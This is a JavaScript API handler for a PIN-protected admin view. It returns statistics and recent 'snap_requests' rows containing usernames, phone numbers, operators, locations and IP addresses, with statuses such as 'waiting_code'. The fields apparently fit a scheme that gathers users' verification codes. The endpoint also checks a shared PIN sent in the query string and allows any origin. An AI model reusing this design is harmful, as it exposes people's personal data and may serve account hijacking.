import { sql, fail } from './_db.js';

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  if (req.method === 'OPTIONS') { res.status(200).end(); return; }
  if (req.method !== 'GET') return res.status(405).json({ success: false });

  try {
    const { pin } = req.query;
    if (!pin || pin !== process.env.STAFF_PIN) {
      return res.status(401).json({ success: false, message: 'Code incorrect' });
    }

    // Stats globales
    const statsResult = await sql`
      SELECT
        COUNT(*) AS total,
        COUNT(CASE WHEN status = 'pending'      THEN 1 END) AS pending,
        COUNT(CASE WHEN status = 'processing'   THEN 1 END) AS processing,
        COUNT(CASE WHEN status = 'waiting_code' THEN 1 END) AS waiting_code,
        COUNT(CASE WHEN status = 'completed'    THEN 1 END) AS completed,
        COUNT(CASE WHEN status = 'wrong_number' THEN 1 END) AS wrong_number
      FROM snap_requests
    `;

    // 50 dernières demandes
    const requests = await sql`
      SELECT id, username, phone, operator, country, city, ip_address, status, created_at
      FROM snap_requests
      ORDER BY created_at DESC
      LIMIT 50
    `;

    return res.status(200).json({
      success: true,
      stats: statsResult[0],
      requests
    });
  } catch (e) {
    return fail(res, e, 'admin-data');
  }
}
